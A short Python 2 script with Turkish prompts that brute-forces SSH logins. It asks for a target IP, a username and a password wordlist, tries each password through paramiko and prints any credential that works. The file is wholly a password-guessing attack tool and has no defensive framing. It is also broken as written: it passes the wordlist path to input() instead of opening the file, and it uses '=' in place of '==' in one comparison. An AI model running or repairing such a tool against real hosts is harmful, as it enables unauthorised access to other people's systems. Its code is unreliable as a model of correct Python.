import paramiko
import sys
import os
import socket

def sshConn(password, code=0):
   ssh = paramiko.SSHClient()
   ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

   try:
      ssh.connect(host, port=22, username=username, password=password)
   except paramiko.AuthenticationException:
      # SSH Baglanti basarisiz oldu
      code = 1
   except socket.error, e:
      # Socket Baglanti basarisiz oldu
      code = 2

   ssh.close()
   return code

try:
   host = raw_input("[*] Hedef makine IP : ")
   username = raw_input("[*] SSH Kullanici Adi : ")
   wordlist = raw_input("[*] SSH Parola Dosyasi : ")

   if os.path.exists(wordlist) == False:
      print "[!] Dosya bulunamadi."
      sys.exit(4)
except KeyboardInterrupt:
   print "[!] Program kapatiliyor."
   sys.exit(3)

wordlist = input(wordlist)

for line in wordlist.readlines():
   password = line.strip()
   try:
      response = sshConn(password)
      if response == 0:
         print "[*] Parola bulundu : " + username + ":" + password
         sys.exit(0)
      elif response = 1:
         print "[!] Hatali parola : " + username + ":" + password
      elif response == 2:
         print "[!]  Baglanti hatasi.."
         sys.exit(2)
   except Exception, e:
      print e
      pass

wordlist.close()


